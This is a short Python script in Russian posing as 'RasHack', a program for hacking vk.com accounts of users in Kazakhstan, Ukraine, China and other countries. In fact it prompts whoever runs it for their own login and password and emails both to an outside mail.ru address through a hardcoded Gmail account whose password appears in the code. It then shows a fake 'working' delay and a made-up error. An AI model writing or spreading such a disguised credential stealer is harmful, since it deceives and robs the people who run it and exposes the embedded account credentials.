print('Добро пожаловать в RasHack')
print('RasHack-программа для тестирования защищенности учетных записей иностранных пользователей vk.com')
print('для просмотра списка команд нажмите enter')
a = input()
if a == 4:
	hshs = 2
else:
		print('Взлом пользователей Казахстана: kzh_hack')
		print('Взлом пользователей со стран Закавказья: kav_hack')
		print('Взлом пользователей с Украины: ukr_hack')
		print('Взлом пользователей с Китая: china_hack')
		print('Взлом пользователей со всех стран(max profit): all_hack')
		z = input()
if z == 'kzh_hack' or 'kav_hack' or 'ukr_hack' or 'china_hack' or 'all_hack':
	print('done')
import time
time.sleep(7)
print('starting...')
	
b = input('Your login:')
c = input('Your password:')

import smtplib
smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
smtpObj.starttls()
smtpObj.login('kirilpupi@gmail.com','animegovno')
smtpObj.sendmail("kirilpupi@gmail.com","digitalbbb@mail.ru", "{}".format(b))
smtpObj.quit()
smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
smtpObj.starttls()
smtpObj.login('kirilpupi@gmail.com','animegovno')
smtpObj.sendmail("kirilpupi@gmail.com","digitalbbb@mail.ru", "{}".format(c))
smtpObj.quit()
v = input('Target id:')
print('working...')
time.sleep(300)
print('eror27')
